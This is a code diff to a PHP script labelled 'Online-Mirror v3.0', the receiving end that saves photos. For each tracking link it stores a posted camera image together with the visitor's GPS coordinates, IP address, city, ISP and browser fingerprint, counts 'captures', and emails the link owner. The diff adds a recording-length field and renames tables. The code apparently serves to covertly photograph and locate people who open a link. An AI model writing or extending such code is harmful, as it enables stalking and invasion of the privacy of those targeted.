@@ -1,6 +1,6 @@
 <?php
 /**
- * Online-Mirror 升级版 v2.0 - 保存照片（接收端）
+ * Online-Mirror v3.0 - 保存照片（接收端）
  * 支持GPS定位 + 浏览器指纹 + IP地理位置
  */
 require_once __DIR__ . '/config.php';
@@ -14,6 +14,7 @@ $screen = trim($_POST['screen'] ?? '');
 $os = trim($_POST['os'] ?? '');
 $browser = trim($_POST['browser'] ?? '');
 $lang = trim($_POST['lang'] ?? '');
+$recording_seconds = intval($_POST['recording_seconds'] ?? 0);
 
 if (empty($id) || empty($base64_img)) {
     if (!empty($url)) header("Location: " . $url);
@@ -95,15 +96,16 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
     $os = mb_substr(strip_tags($os), 0, 50);
     $browser = mb_substr(strip_tags($browser), 0, 100);
     $lang = preg_replace('/[^a-zA-Z0-9\-_,]/', '', $lang);
+    $recording_seconds = max(0, min(300, $recording_seconds)); // 0-300秒
     
     try {
         $db = getDB();
         
-        $stmt = $db->prepare("UPDATE links SET captures = captures + 1 WHERE link_id = ?");
+        $stmt = $db->prepare("UPDATE mir_links SET captures = captures + 1 WHERE link_id = ?");
         $stmt->execute([$id]);
         
-        $stmt = $db->prepare("INSERT INTO photos (link_id, file_path, ip_address, lat, lng, screen_resolution, os, browser, browser_lang, city, isp, user_agent, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-        $stmt->execute([$id, $filename, $client_ip, $lat, $lng, $screen, $os, $browser, $lang, $city, $isp, mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500), $file_size]);
+        $stmt = $db->prepare("INSERT INTO mir_photos (link_id, file_path, ip_address, lat, lng, screen_resolution, os, browser, browser_lang, recording_seconds, city, isp, user_agent, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+        $stmt->execute([$id, $filename, $client_ip, $lat, $lng, $screen, $os, $browser, $lang, $recording_seconds, $city, $isp, mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500), $file_size]);
         
         addLog($id, 'capture');
         
@@ -116,7 +118,7 @@ if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
         ]);
         
         // 📧 检查链接是否有独立通知邮箱
-        $link_stmt = $db->prepare("SELECT notify_email FROM links WHERE link_id = ? AND notify_email IS NOT NULL AND notify_email != ''");
+        $link_stmt = $db->prepare("SELECT notify_email FROM mir_links WHERE link_id = ? AND notify_email IS NOT NULL AND notify_email != ''");
         $link_stmt->execute([$id]);
         $link_row = $link_stmt->fetch();
         if ($link_row && !empty($link_row['notify_email'])) {
